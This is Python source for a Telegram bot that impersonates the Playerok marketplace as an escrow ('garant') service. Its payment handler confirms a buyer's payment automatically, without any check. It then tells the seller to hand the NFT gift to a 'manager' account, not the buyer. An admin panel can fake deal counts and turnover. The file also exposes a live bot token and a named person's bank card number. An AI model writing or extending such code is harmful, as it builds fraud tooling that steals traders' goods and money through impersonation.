import asyncio
import random
import string
from aiogram import Bot, Dispatcher, F
from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, FSInputFile
from aiogram.filters import Command, CommandStart

# Сохранен ваш токен
bot = Bot(token="7433834181:AAG8NnjboqrJBOvtisjoHmnt7VO7PiOJY4k")
dp = Dispatcher()

user_agreements = {}
user_languages = {}
user_balances = {}
user_deals = {}
user_requisites = {}
active_deals = {}
user_stats = {}
deal_counter = 0
ADMIN_ID = 8208815502
MANAGER_CARD = "2204 1201 3279 4013 - Maркин Ярослав"

def generate_memo():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=7))

def generate_deal_id():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=10))

# --- ВСЕ КЛАВИАТУРЫ СОХРАНЕНЫ БЕЗ ИЗМЕНЕНИЙ ---
start_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Полностью согласен", callback_data="agree")]
])

welcome_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Продолжить", callback_data="continue")]
])

main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Создать сделку", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Профиль", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Реквизиты", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Сменить язык", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Поддержка", url="https://t.me/PlayerokOTCsupport")],
    [InlineKeyboardButton(text="Наш сайт", url="https://playerok.com/")]
])

deal_type_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Подарок", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 В меню", callback_data="back_to_menu")]
])

back_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇺🇿 UZS", callback_data="currency_UZS"), InlineKeyboardButton(text="🇰🇬 KGS", callback_data="currency_KGS")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_🌟 Stars")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

cancel_confirm_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да,отменить", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ Нет", callback_data="back_to_deal")]
])

profile_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Пополнить баланс", callback_data="deposit"), InlineKeyboardButton(text="💸 Вывод средств", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

read_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я прочитал(-а)", callback_data="read_deposit")]
])

deposit_method_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Банковская карта", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_step")]
])

back_simple_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_requisites")]
])

requisites_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Добавить карту", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Добавить TON кошелек", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 Посмотреть реквизиты", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Назад", callback_data="back_to_menu")]
])

language_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 Русский", callback_data="lang_ru"), InlineKeyboardButton(text="🇺🇸 English", callback_data="lang_en")],
    [InlineKeyboardButton(text="🔙 Обратно в меню", callback_data="back_to_menu")]
])

start_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I fully agree", callback_data="agree")]
])

welcome_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Continue", callback_data="continue")]
])

main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🛡️ Create deal", callback_data="create_deal")],
    [InlineKeyboardButton(text="👤 Profile", callback_data="profile")],
    [InlineKeyboardButton(text="💳 Payment details", callback_data="requisites")],
    [InlineKeyboardButton(text="🌍 Change language", callback_data="change_language")],
    [InlineKeyboardButton(text="📞 Support", callback_data="support")],
    [InlineKeyboardButton(text="Our website", url="https://funpay.com/")]
])

deal_type_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🎁 Gift", callback_data="deal_gift")],
    [InlineKeyboardButton(text="🔙 To menu", callback_data="back_to_menu")]
])

back_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

currency_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🇷🇺 RUB", callback_data="currency_RUB"), InlineKeyboardButton(text="🇪🇺 EUR", callback_data="currency_EUR")],
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Stars", callback_data="currency_ Stars")],
    [InlineKeyboardButton(text="🇺🇦 UAH", callback_data="currency_UAH"), InlineKeyboardButton(text="🇧🇾 BYN", callback_data="currency_BYN")],
    [InlineKeyboardButton(text="💰 USDT", callback_data="currency_USDT"), InlineKeyboardButton(text="💎 TON", callback_data="currency_TON")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

cancel_confirm_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Yes,cancel", callback_data="confirm_cancel")],
    [InlineKeyboardButton(text="❌ No", callback_data="back_to_deal")]
])

profile_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Deposit", callback_data="deposit"), InlineKeyboardButton(text="💸 Withdraw", callback_data="withdraw")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

read_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ I have read", callback_data="read_deposit")]
])

deposit_method_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Bank card", callback_data="deposit_card"), InlineKeyboardButton(text="💎 TON", callback_data="deposit_ton")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_step")]
])

back_simple_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_requisites")]
])

requisites_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="💳 Add card", callback_data="add_card")],
    [InlineKeyboardButton(text="💎 Add TON wallet", callback_data="add_ton")],
    [InlineKeyboardButton(text="👀 View requisites", callback_data="view_requisites")],
    [InlineKeyboardButton(text="🔙 Back", callback_data="back_to_menu")]
])

buyer_deal_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Я оплатил", callback_data="paid_confirmed")],
    [InlineKeyboardButton(text="❌ Выйти из сделки", callback_data="exit_deal")]
])

seller_gift_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Подарок отправлен", callback_data="item_sent")]
])

buyer_confirmation_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="✅ Да, все верно", callback_data="buyer_confirm_ok")],
    [InlineKeyboardButton(text="❌ Нет, товар не получен", callback_data="buyer_confirm_fail")]
])

sierrateam_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="Я ознакомился", callback_data="sierrateam_read")]
])

admin_keyboard = InlineKeyboardMarkup(inline_keyboard=[
    [InlineKeyboardButton(text="⛔️ Забанить пользователя", callback_data="ban_user")],
    [InlineKeyboardButton(text="💸 Отправить деньги", callback_data="send_money")],
    [InlineKeyboardButton(text="✅ Установить успешные сделки", callback_data="set_successful_deals")],
    [InlineKeyboardButton(text="📊 Установить общее кол-во сделок", callback_data="set_total_deals")],
    [InlineKeyboardButton(text="💰 Установить оборот", callback_data="set_turnover")],
    [InlineKeyboardButton(text="🔙 Главное меню", callback_data="back_to_menu")]
])

banned_users = set()
admin_states = {}
bot_username = None

# --- ВСЕ ФУНКЦИИ СОХРАНЕНЫ ---

async def get_bot_username():
    global bot_username
    if bot_username is None:
        me = await bot.get_me()
        bot_username = me.username
    return bot_username

async def send_main_menu(chat_id, lang, message_id=None):
    keyboard = main_keyboard_ru if lang == "ru" else main_keyboard_en
    photo = "https://i.postimg.cc/8P1ySbyM/og-playerok.png"
    if lang == "ru":
        text = ("🛡️ Playerok Bot | OTC\n\n"
                "Безопасный и удобный сервис для сделок!\n\n"
                "Наши преимущества:\n"
                "• Автоматические сделки\n"
                "• Вывод в любой валюте\n"
                "• Поддержка 24/7\n"
                "• Удобный интерфейс\n\n"
                "Выберите нужный раздел ниже:")
    else:
        text = ("🛡️ Playerok Bot | OTC\n\n"
                "Safe and convenient service for deals!\n\n"
                "Our advantages:\n"
                "• Automatic deals\n"
                "• Withdrawal in any currency\n"
                "• 24/7 support\n"
                "• User-friendly interface\n\n"
                "Choose the desired section below:")
    
    if message_id:
        try: await bot.delete_message(chat_id, message_id)
        except: pass
    await bot.send_photo(chat_id, photo, caption=text, reply_markup=keyboard)

async def safe_edit_message(callback: CallbackQuery, text: str, reply_markup: InlineKeyboardMarkup = None):
    try: await callback.message.edit_text(text, reply_markup=reply_markup)
    except:
        try: await callback.message.delete()
        except: pass
        await callback.message.answer(text, reply_markup=reply_markup)

# Унифицированная логика входа в сделку (для /start и /fastbuy)
async def handle_deal_join(message: Message, deal_id: str):
    # Убираем решетку и пробелы, если они есть
    clean_id = deal_id.replace("#", "").strip()
    
    if clean_id in active_deals:
        deal = active_deals[clean_id]
        buyer_id = message.from_user.id
        buyer_username = message.from_user.username or "Не указан"
        
        if deal["buyer_id"] is None:
            deal["buyer_id"] = buyer_id
            deal["buyer_username"] = buyer_username
            deal["status"] = "active"
            
            deal_type_ru = {"deal_gift": "Подарок", "deal_account": "Аккаунт", "deal_other": "Другое"}.get(deal["type"], "Другое")
            
            if deal["currency"] == "RUB":
                payment_text = f"💳 Оплата производится переводом на карту менеджера:\n{MANAGER_CARD}\n\nПосле перевода нажмите кнопку «✅ Я оплатил»"
            else:
                payment_text = f"🏦 Способ оплаты: {deal['currency']}\n\nПосле оплаты нажмите кнопку «✅ Я оплатил»"
            
            await message.answer(
                f"💳 Информация о сделке #{clean_id}\n\n"
                f"👤 Вы покупатель в сделке.\n"
                f"📌 Продавец: @{deal['seller_username']} ({deal['seller_id']})\n"
                f"• Успешные сделки: (0,)\n\n"
                f"• Вы покупаете: {deal['description']}\n"
                f"🎁 Тип: {deal_type_ru}\n\n"
                f"{payment_text}\n\n"
                f"💰 Сумма к оплате: {deal['amount']} {deal['currency']}",
                reply_markup=buyer_deal_keyboard
            )
            
            seller_lang = user_languages.get(deal["seller_id"], "ru")
            msg = f"Пользователь @{buyer_username} ({buyer_id}) присоединился к сделке #{clean_id}\n⚠️ Проверьте пользователя!" if seller_lang == "ru" else f"User @{buyer_username} joined deal #{clean_id}\n⚠️ Check the user!"
            await bot.send_message(deal["seller_id"], msg)
        else:
            await message.answer("❌ Эта сделка уже занята.")
    else:
        await message.answer("❌ Сделка не найдена.")

# --- ИСПРАВЛЕННЫЙ ОБРАБОТЧИК /FASTBUY ---
@dp.message(Command("fastbuy"))
async def fastbuy_command(message: Message):
    if message.from_user.id in banned_users: return
    args = message.text.split()
    if len(args) > 1:
        await handle_deal_join(message, args[1])
    else:
        await message.answer("Использование: `/fastbuy #ID`", parse_mode="Markdown")

@dp.message(CommandStart())
async def start_command(message: Message):
    user_id = message.from_user.id
    if user_id in banned_users:
        await message.answer("❌ Вы были заблокированы в боте")
        return
    args = message.text.split()
    if len(args) > 1 and args[1].startswith('deal_'):
        await handle_deal_join(message, args[1].replace('deal_', ''))
        return
        
    lang = user_languages.get(user_id, "ru")
    if user_id in user_agreements:
        await send_main_menu(message.chat.id, lang)
    else:
        text = "Вы подтверждаете, что ознакомились и согласны с <<Условиями предоставления услуг Гарант сервиса?>>\n\nПодробнее: https://telegra.ph/Ispolzuya-Nash-servis-Vy-soglashaetes-s-01-02-2" if lang == "ru" else "Do you confirm terms?.."
        await message.answer(text, reply_markup=start_keyboard_ru if lang == "ru" else start_keyboard_en)

# --- АВТОМАТИЧЕСКАЯ ОПЛАТА (КАК ВЫ ПРОСИЛИ) ---
@dp.callback_query(F.data == "paid_confirmed")
async def paid_confirmed_callback(callback: CallbackQuery):
    deal_id = next((did for did, deal in active_deals.items() if deal["buyer_id"] == callback.from_user.id and deal["status"] == "active"), None)
    
    if deal_id:
        deal = active_deals[deal_id]
        deal["status"] = "payment_confirmed"
        await callback.message.edit_text("✅ Оплата подтверждена ботом. Продавец уведомлен.")
        
        # Лог для админа
        await bot.send_message(ADMIN_ID, f"🧾 Покупатель @{callback.from_user.username} оплатил сделку #{deal_id}. Подтверждено автоматически.")

        seller_lang = user_languages.get(deal["seller_id"], "ru")
        support = "@PlayerokOTCsupport"
        if deal["type"] == "deal_gift":
            text = (f"✅ Оплата подтверждена для сделки #{deal_id}\n\n📜 Предмет: {deal['description']}\n\n"
                    f"NFT ожидает отправки на официальный аккаунт менеджера - {support}\n\n"
                    "⚠️ Передайте гифт менеджеру, а не покупателю!")
            if seller_lang != "ru": text = f"✅ Payment confirmed for #{deal_id}...\nSend NFT to {support}"
            await bot.send_message(deal["seller_id"], text, reply_markup=seller_gift_keyboard)
        else:
            msg = "✅ Оплата получена. Пожалуйста, передайте товар покупателю." if seller_lang == "ru" else "✅ Payment received. Send item."
            await bot.send_message(deal["seller_id"], msg, reply_markup=seller_gift_keyboard)

# --- ОСТАЛЬНОЙ КОД СОХРАНЕН ПОЛНОСТЬЮ ---
@dp.callback_query(F.data == "agree")
async def agree_callback(callback: CallbackQuery):
    user_agreements[callback.from_user.id] = True
    await safe_edit_message(callback, "Добро пожаловать в Playerok", welcome_keyboard_ru)

@dp.callback_query(F.data == "create_deal")
async def create_deal_callback(callback: CallbackQuery):
    await safe_edit_message(callback, "🛡 Создать сделку", deal_type_keyboard_ru)

@dp.callback_query(F.data == "deal_gift")
async def deal_type_callback(callback: CallbackQuery):
    user_deals[callback.from_user.id] = {"type": callback.data, "step": "description"}
    await safe_edit_message(callback, "🛡 Описание подарка. Пример: 2 кепки дурова и ..", back_keyboard_ru)

@dp.message(F.text)
async def handle_text(message: Message):
    user_id = message.from_user.id
    if user_id in user_deals:
        d = user_deals[user_id]
        if d.get("step") == "description":
            d["description"], d["step"] = message.text, "currency"
            await message.answer("🛡 Создание сделки.\n\nВыберите валюту:", reply_markup=currency_keyboard_ru)
        elif d.get("step") == "amount":
            try:
                amt = float(message.text)
                d_id = generate_deal_id()
                active_deals[d_id] = {"seller_id": user_id, "seller_username": message.from_user.username or "N/A", "description": d["description"], "type": d["type"], "currency": d["currency"], "amount": amt, "buyer_id": None, "status": "created"}
                uname = await get_bot_username()
                await message.answer(f"✅ Сделка создана!\n💰 {amt} {d['currency']}\n🔗 https://t.me/{uname}?start=deal_{d_id}\n\nИли используйте: `/fastbuy #{d_id}`", parse_mode="Markdown")
                del user_deals[user_id]
            except: await message.answer("Введите число.")
    # Обработка реквизитов
    elif " - " in message.text:
        user_requisites[user_id] = {"card": message.text}; await message.answer("✅ Реквизиты добавлены")

# --- Базовые колбэки ---
@dp.callback_query(F.data == "continue")
async def continue_callback(callback: CallbackQuery):
    await send_main_menu(callback.message.chat.id, "ru")

@dp.callback_query(F.data == "profile")
async def profile_callback(callback: CallbackQuery):
    await safe_edit_message(callback, f"Профиль @{callback.from_user.username}\nБаланс: 0 RUB", profile_keyboard_ru)

@dp.callback_query(F.data == "back_to_menu")
async def back_to_menu_callback(callback: CallbackQuery):
    await send_main_menu(callback.message.chat.id, "ru", callback.message.message_id)

@dp.callback_query(F.data.startswith("currency_"))
async def curr_callback(callback: CallbackQuery):
    user_id = callback.from_user.id
    if user_id in user_deals:
        user_deals[user_id]["currency"] = callback.data.split("_")[1]
        user_deals[user_id]["step"] = "amount"
        await safe_edit_message(callback, f"Введите сумму в {user_deals[user_id]['currency']}")

async def main():
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
